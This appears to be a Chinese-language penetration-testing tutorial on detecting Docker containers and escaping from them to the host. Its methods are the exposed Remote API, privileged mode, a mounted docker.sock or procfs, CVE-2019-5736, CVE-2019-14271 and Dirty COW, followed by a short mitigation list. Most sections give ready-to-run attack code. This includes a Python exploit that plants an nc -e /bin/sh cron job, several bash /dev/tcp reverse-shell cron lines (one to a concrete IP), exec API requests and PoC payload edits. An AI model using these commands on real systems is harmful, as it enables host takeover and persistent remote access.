@@ -1,0 +1,424 @@
+Docker逃逸在渗透测试中面向的场景大概是这样，渗透拿到shell后，发现主机是docker环境，要进一步渗透，就必须逃逸到“直接宿主机”。甚至还有物理机运行虚拟机，虚拟机运行Docker容器的情况。那就还要虚拟机逃逸了。所以本文给大家介绍的就是如何判断当前环境是否为docker容器环境，其次通过几种方式进行docker逃逸。
+
+## 如何判断当前机器是否为Docker容器环境
+
+Metasploit中的checkcontainer模块、（判断是否为虚拟机，checkvm模块）。
+
+### 1\. 检查根目录下是否存在.dockerenv文件
+
+![1](https://image.3001.net/images/20221019/1666188814_6350060e248f7c10a8231.png!small)
+
+![2](https://image.3001.net/images/20221019/1666188814_6350060e9301c108eec57.png!small)
+
+### 2\. 检查/proc/1/cgroup是否存在还有docker字符串
+
+![1666188525_635004edeb6eb768fae7a.png!small?1666188526385](https://image.3001.net/images/20221019/1666188525_635004edeb6eb768fae7a.png!small?1666188526385)
+
+![3](https://image.3001.net/images/20221019/1666188815_6350060f5a621d67f47a4.png!small)
+
+###
+
+    
+    
+    cat /proc/1/cgroup
+
+![4](https://image.3001.net/images/20221019/1666188816_63500610e05399a6fdbe7.png!small)
+
+### 3\. 检查是否存在container环境变量
+
+通过env\PATH来检查是否有docker相关的环境变量，来进一步判断。
+
+### 4\. 其他检测方式
+
+如检测mount、fdisk -l查看硬盘、判断PID 1的进程名等也可用来辅助判断。
+
+## Docker逃逸方式
+
+### 1\. 危险的配置导致Docker逃逸
+
+由于"纵深防御" 和
+"最小权限"等理念和原则落地，越来越难以直接利用漏洞来进行利用。另一方面，公开的漏洞，安全运维人员能够及时将其修复，当然，不免存在漏网之鱼。相反，更多的是利用错误的、危险的配置来进行利用，不仅仅Docker逃逸，其他漏洞也是，比如生产环境开启Debug模式导致漏洞利用等等。
+
+Docker已经将容器运行时的Capabilities黑名单机制改为如今的默认禁止所有Capabilities，再以白名单方式赋予容器运行所需的最小权限。
+
+#### docket remote api未授权访问导致逃逸。
+
+docker swarm是管理docker集群的工具。主从管理、默认通过2375端口通信。绑定了一个Docker Remote
+API的服务，可以通过HTTP、Python、调用API来操作Docker
+
+Docker Remote API的端口2375端口
+
+访问<http://your-ip:2375/version>
+
+火狐打开如下，证明存在未授权访问漏洞。
+
+![5](https://image.3001.net/images/20221019/1666188817_6350061188ceee4db613a.png!small)
+
+在kali上开启nc监听本地端口，用来接收反弹shell。
+
+反弹Shell exp：
+
+    
+    
+    import docker   
+    client = docker.DockerClient(base_url='http://your-ip:2375/')   
+    data = client.containers.run('alpine:latest', r'''sh -c "echo '* * * * * /usr/bin/nc your-ip 21 -e /bin/sh' >> /tmp/etc/crontabs/root" ''', remove=True, volumes={'/etc': {'bind': '/tmp/etc', 'mode': 'rw'}})
+
+执行脚本，shell会反弹到kali主机上
+
+Github上的exp：<https://github.com/Tycx2ry/docker_api_vul>
+
+![6](https://image.3001.net/images/20221019/1666188818_635006121d3378154ddde.png!small)
+
+ **另一种方式**
+
+首先访问<http://your-ip:2375/version>
+
+![7](https://image.3001.net/images/20221019/1666188818_63500612c4aca4a1c0686.png!small)
+
+访问`http://ip:2375/containers/json`
+
+![8](https://image.3001.net/images/20221019/1666188819_635006134133a0cc3a70a.png!small)
+
+创建一个包，得到返回的exec_id的参数，数据包内容如下：
+
+    
+    
+    POST /containers/<container_id>/exec HTTP/1.1  
+    Host: <docker_host>:PORT  
+    Content-Type: application/json  
+    Content-Length: 188  
+    ​  
+    {  
+    “AttachStdin”: true,  
+    “AttachStdout”: true,  
+    “AttachStderr”: true,  
+    “Cmd”: [“cat”, “/etc/passwd”],  
+    “DetachKeys”: “ctrl-p,ctrl-q”,  
+    “Privileged”: true,  
+    “Tty”: true  
+    }
+
+![9](https://image.3001.net/images/20221019/1666188819_63500613c9494beb3701c.png!small)
+
+注意其中的cmd字段，这个就是要执行的命令。
+
+得到exec_id参数后构造第二个exec_start数据包，内容如下
+
+    
+    
+    POST /exec/<exec_id>/start HTTP/1.1  
+    Host: <docker_host>:PORT  
+    Content-Type: application/json  
+    ​  
+    {  
+    “Detach”: false,  
+    “Tty”: false  
+    }
+
+![10](https://image.3001.net/images/20221019/1666188820_635006146c58532b244ba.png!small)
+
+到此成功获取到docker主机的命令执行权限，但是还没有逃逸到宿主机，在docker容器中安装docker做为client（kali中有的话就不需要了），
+
+    
+    
+    apt-get install docker.io`  
+    `yum -y install docker
+
+查看宿主机的docker image信息
+
+    
+    
+    docker -H tcp://宿主机ip:2375 images
+
+启动一个容器并且将宿主机的根目录装到容器内的某个目录。
+
+    
+    
+    docker -H tcp://宿主ip:2375 run -it -v /:/test adafef2e596e /bin/bash 
+
+上述命令的意思是将宿主机的根目录挂在到容器adafef2e596e的/test目录下
+
+写一个计划任务反弹shell(或者写.ssh公钥都OK)
+
+    
+    
+    echo '* * * * * bash -i >& /dev/tcp/x.x.x.x/8888 0>&1' >> /test/var/spool/cron/root
+
+在vps上使用nc命令等待反弹过来的shell`nc -lvp 8888`
+
+  
+
+#### Docker高危启动参数--privileged 特权模式启动容器
+
+使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行docker run
+—privileged时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。
+
+当操作者执行docker run
+--privileged时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限。
+
+特权模式启动一个Ubuntu容器：`sudo docker run -itd --privileged ubuntu:latest /bin/bash`
+
+进入容器，使用fdisk命令查看磁盘文件：
+
+    
+    
+    fdisk -l
+
+![11](https://image.3001.net/images/20221019/1666188821_635006152aac54fcf97f0.png!small)
+
+在特权模式下，逃逸的方式很多，比如：直接在容器内部挂载宿主机磁盘，然后切换根目录。
+
+    
+    
+    mkdir /test  
+    mount /dev/vda1 /test
+
+新建一个目录：mkdir /test 挂载磁盘到新建目录：mount /dev/vda1 /test 切换根目录：chroot /test
+到这里已经成功逃逸了，然后就是常规的反弹shell 和 写 SSH 了(和redis未授权差不多）。
+
+![12](https://image.3001.net/images/20221019/1666188822_635006160ab6038e705df.png!small)
+
+写计划任务，反弹宿主机Shell。`echo '* * * * * /bin/bash -i >& /dev/tcp/39.106.51.35/1234
+0>&1' >> /test/var/spool/cron/crontabs/root`
+
+如果要写SSH的话，需要挂载宿主机的root目录到容器。 docker run -itd -v /root:/root ubuntu:18.04
+/bin/bash mkdir /root/.ssh cat id_rsa.pub >> /root/.ssh/authorized_keys 然后ssh
+私钥登录。
+
+其他参数： Docker 通过Linux
+namespace实现6项资源隔离，包括主机名、用户权限、文件系统、网络、进程号、进程间通讯。但部分启动参数授予容器权限较大的权限，从而打破了资源隔离的界限。
+
+\--cap-add=SYS_ADMIN 启动时，允许执行mount特权操作，需获得资源挂载进行利用。
+
+\--net=host 启动时，绕过Network Namespace
+
+\--pid=host 启动时，绕过PID Namespace
+
+\--ipc=host 启动时，绕过IPC Namespace
+
+### 2\. 危险挂载导致Docker逃逸
+
+挂载目录（-v /:/soft）
+
+    
+    
+    docker run -itd -v /dir:/dir ubuntu:18.04 /bin/bash
+
+#### 挂载Docker Socket
+
+Docker采用C/S架构，我们平常使用的Docker命令中，docker即为client，Server端的角色由docker
+daemon扮演，二者之间通信方式有以下3种：
+
+  * unix:///var/run/docker.sock(默认
+
+  * tcp://host:port
+
+  * fd://socketfd
+
+Docker Socket是Docker守护进程监听的Unix域套接字，用来与守护进程通信——查询信息或下发命令。
+
+逃逸复现：
+
+  1. 首先创建一个容器并挂载/var/run/docker.sock； docker run -itd -v /var/run/docker.sock:/var/run/docker.sock ubuntu
+
+  2. 在该容器内安装Docker命令行客户端； apt-update apt-get install \ apt-transport-https \ ca-certificates \ curl \ gnupg-agent \ software-properties-common curl -fsSL <https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/gpg>| apt-key add - apt-key fingerprint 0EBFCD88 add-apt-repository \ "deb [arch=amd64] <https://mirrors.ustc.edu.cn/docker-ce/linux/ubuntu/>\ $(lsb_release -cs) \ stable" apt-get update apt-get install docker-ce docker-ce-cli containerd.io
+
+  3. 接着使用该客户端通过Docker Socket与Docker守护进程通信，发送命令创建并运行一个新的容器，将宿主机的根目录挂载到新创建的容器内部；docker run -it -v /:/host ubuntu:18.04 /bin/bash ![13](https://image.3001.net/images/20221019/1666188823_63500617ad2107a0e96c2.png!small)
+
+  4. 在新容器内执行chroot将根目录切换到挂载的宿主机根目录。 已成功逃逸到宿主机。 ![20221019220451.png](https://image.3001.net/images/20221019/1666188824_63500618730c892ed0cf1.png!small)
+
+![15](https://image.3001.net/images/20221019/1666188825_63500619dbc8c96d4cd7f.png!small)
+
+#### 挂载宿主机procfs
+
+    
+    
+    docker run -itd -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu
+
+为了区分，挂载到容器的/host/目录下
+
+procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User
+Namespace时。
+
+从2.6.19内核版本开始，Linux支持在/proc/sys/kernel/core_pattern中使用新语法。如果该文件中的首个字符是管道符|，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。
+
+ **Docker默认情况下不会为容器开启User Namespace**
+根据参考资料1，一般情况下不会将宿主机的procfs挂载到容器中，然而有些业务为了实现某些特殊需要，还是会有。 一些细节原理看参考资料1哈，这里专注于利用。
+复现：“在挂载procfs的容器内利用core_pattern后门实现逃逸“
+利用思路：攻击者进入到挂载了宿主机profs的容器，root权限，然后向宿主机的procfs写Payload
+
+### 3\. 程序漏洞导致Docker逃逸
+
+#### runC容器逃逸漏洞CVE-2019-5736
+
+##### 漏洞简述：
+
+Docker 18.09.2之前的版本中使用了的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc
+二进制文件，攻击者可以在宿主机上以root身份执行命令。
+
+即通过在docker容器中重写和运行主机系统的runc二进制文件达到逃逸的目的 利用条件： Docker版本 < 18.09.2，runc版本<
+1.0-rc6，一般情况下，可通过 docker 和docker-runc 查看当前版本情况。
+
+##### 利用步骤：
+
+![1666188600_6350053896b7c33c46540.png!small?1666188600980](https://image.3001.net/images/20221019/1666188600_6350053896b7c33c46540.png!small?1666188600980)
+
+版本合适的情况下去尝试
+
+首先我们要有一个docker下的shell，第二步利用脚本中的反弹shell命令，第三步使用go
+build来编译脚本，第四步将脚本上传到docker中，第五步等待宿主机执行exec进入当前docker容器的时候，宿主机就会向我们的vps反弹root权限的shell
+
+下载poc`git clone
+https://github.com/Frichetten/CVE-2019-5736-PoC.git`PoC修改Payload`vi main.go`
+
+选中部分修改\n后面的命令为反弹shell命令即可`payload = "#!/bin/bash \n bash -i >&
+/dev/tcp/192.168.172.136/1234 0>&1"`
+
+![16](https://image.3001.net/images/20221019/1666188826_6350061ac60af18ff525c.png!small)编译生成payload`CGO_ENABLED=0
+GOOS=linux GOARCH=amd64 go build main.go`拷贝到docker容器中执行`sudo docker cp ./main
+248f8b7d3c45:/tmp`
+
+也可以先上传到github上，用git clone命令下载。或者上传到vps上，然后在vps上用python开启一个http服务，再用wget下载即可。
+
+执行此脚本，然后等待宿主机用户进入这个容器中：
+
+    
+    
+    docker exec -it test /bin/bash
+
+上面命令的含义是进入test这个容器，当宿主机上执行exec命令来进入我们运行了脚本的容器的时候，宿主机就会反弹root权限的shell给我们的vps的监听端口，至此利用结束。
+
+如果没有人在宿主机执行的话是无法docker逃逸的
+
+#### Docker cp命令容器逃逸攻击漏洞CVE-2019-14271
+
+漏洞描述：
+
+当Docker宿主机使用cp命令时，会调用辅助进程docker-tar，该进程没有被容器化，且会在运行时动态加载一些libnss.so库。黑客可以通过在容器中替换libnss.so等库，将代码注入到docker-tar中。当Docker用户尝试从容器中拷贝文件时将会执行恶意代码，成功实现Docker逃逸，获得宿主机root权限。 影响版本： Docker
+19.03.0
+
+ **漏洞原理**
+
+Copy命令允许从容器复制文件。复制文件到容器以及在容器之间复制文件。它的语法和标准Unix的cp命令非常相似。如果从容器中复制/var/logs/，需要使用的语法为：
+
+    
+    
+    docker cp container_name:/var/logs /some/host/path.
+
+把文件复制到容器外，docker需要借助一个名为`docker-tar`的帮助进程
+
+![17](https://image.3001.net/images/20221019/1666188827_6350061b87f574e295747.png!small)
+
+`docker-tar`的工作原理是对文件进行chroot，将请求的文件和目录放在其中，然后将其生成的tar文件传递回Docker的守护程序，该守护程序负责将其提取到宿主机的目标目录中。
+
+    
+    
+    CHROOT就是Change Root，也就是改变程序执行时所参考的根目录位置
+
+Docker-tar chroot进入容器：
+
+![18](https://image.3001.net/images/20221019/1666188828_6350061c197ed8a47dc22.png!small)
+
+选择chroot的方式，有一个主要原因是为了避免符号链接问题，当主机进程尝试访问容器上的文件时，可能会产生符号链接的问题。在这些文件中，如果包含符号链接，那么可能会在无意中将其解析为主机根目录。这就为攻击者控制的容器敞开了大门，使得攻击者可以尝试让`docker
+cp`在宿主机而非容器上读取和写入文件
+
+有漏洞的版本使用Go v1.11编译而成的
+
+这个版本中的一些包含嵌入式C语言代码的软件包（cgo）在运行时会加载动态共享库
+
+这些软件包包括`net`和`os/user`，都会被`docker-tar`使用，它们会在运行时加载多个`libnss_*.so`库。
+
+通常，这些库会从宿主机的文件系统中加载，但是由于`docker-tar`会`chroots`到容器中，因此它会从容器文件系统中加载库。这也就意味着，`docker-tar`将加载并执行由容器发起和控制的代码。
+
+需要说明的是，除了被`chroot`到容器文件系统之外，`docker-tar`并没有被容器化。它运行在宿主机的命名空间中，具有所有root能力，并且不会受到cgroups或seccomp的限制。
+
+有一种可能的攻击场景，是Docker用户从以下任一用户的位置复制一些文件：
+
+  1. 运行包含恶意`libnss_*.so`库中恶意映像的容器；
+
+  2. 受到攻击的容器，且攻击者替换了其中的`libnss_*.so`库
+
+在这两种情况时，攻击者都可以在宿主机上实现root权限的任意代码执行。
+
+ **利用思路**
+
+  1. 找出docker-tar具体会加载那些容器内的动态链接库
+
+  2. 下载对应动态链接库源码，为其增加一个 **attribute** ((constructor))属性的函数run_at_link（该属性意味着在动态链接库被进程加载时，run_at_link函数会首先被执行），在run_at_link函数中放置我们希望docker-tar执行的攻击载荷（payload）；编译生成动态链接文件
+
+  3. 编写辅助脚本”/breakout“，将辅助脚本和步骤二生成的恶意动态链接库放入恶意容器，等待用户执行docker cp命令，触发漏洞
+
+具体复现利用可参考下面的文章：
+
+<https://cloud.tencent.com/developer/news/485728>
+
+<https://blog.csdn.net/qq_41667409/article/details/121557358>
+
+### 4\. Dirty Cow内核漏洞导致Docker逃逸
+
+#### Dirty Cow(CVE-2016-5195)脏牛漏洞实现Docker 逃逸
+
+##### 前置知识
+
+  1. VDSO其实就是将内核中的.so文件映射到内存中，.so文件是基于Linux下的动态链接，其功能和作用类似于Windows下的.dll文件
+
+  2. 在Linux中，有一个功能：VDSO(virtual dvnamic shared object)，这是一个小型共享库，能够将内核自动映射到所有用户程序的地址空间，可以理解成将内核中的函数映射到内存中，方便大家访问
+
+  
+
+Dirty cow漏洞可以让我们获取只读内存的写的权限，我们首先利用dirty
+cow漏洞写入一段shellcode到VDSO映射的一段闲置内存中，然后改变函数的执行顺序，使得调用正常的任意函数之前都要执行这段shellcode。这段shellcode初始化的时候会检查是否被root调用，如果是则继续执行，如果不是，则接着执行clock_gettime函数，接下来它会检测/tmp/.X文件的存在，如果存在，则这时已经是root权限了，然后它会打开一个反向的TCP链接，为Shellcode中填写的ip返回一个Shell。
+
+//这种利用方法利用成功的前提是，宿主机的内核有Dirty Cow漏洞
+
+Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，通过它可实现Docker容器逃逸，获得root权限的shell。
+
+Docker 与 宿主机共享内核，因此容器需要在存在dirtyCow漏洞的宿主机里。 环境获取：git clone
+<https://github.com/gebl/dirtycow-docker-vdso.git>
+
+##### 利用过程
+
+下载脚本
+
+    
+    
+    git clone https://github.com/scumjr/dirtycow-vdso.git  
+    cd /dirtycow-vdso/  
+    make
+
+![19](https://image.3001.net/images/20221019/1666188828_6350061c9ed1cd5ce995a.png!small)
+
+    
+    
+    ./0xdeadbeef #反弹shell到本地主机  
+    ./0xdeadbeef ip:port #反弹shell到指定主机的指定端口
+
+利用结果
+
+直接反弹宿主机的shell到127.0.0.1
+
+![20](https://image.3001.net/images/20221019/1666188829_6350061d3516380a26d07.png!small)
+
+docker 逃逸成功
+
+## 防止docker逃逸的方法
+
+1、更新Docker版本到19.03.1及更高版本——CVE-2019-14271、覆盖CVE-2019-5736
+
+2、runc版本 > 1.0-rc6
+
+3、k8s 集群版本>1.12
+
+4、Linux内核版本>=2.6.22——CVE-2016-5195(脏牛)
+
+5、Linux内核版本>=4.14——CVE-2017–1000405(大脏牛)，未找到docker逃逸利用过程，但存在逃逸风险
+
+6、不建议以root权限运行Docker服务
+
+7、不建议以privileged（特权模式）启动Docker
+
+8、不建议将宿主机目录挂载至容器目录
+
+9、不建议将容器以—cap-add=SYSADMIN启动，SYSADMIN意为container进程允许执行mount、umount等一系列系统管理操作，存在容器逃逸风险。
+
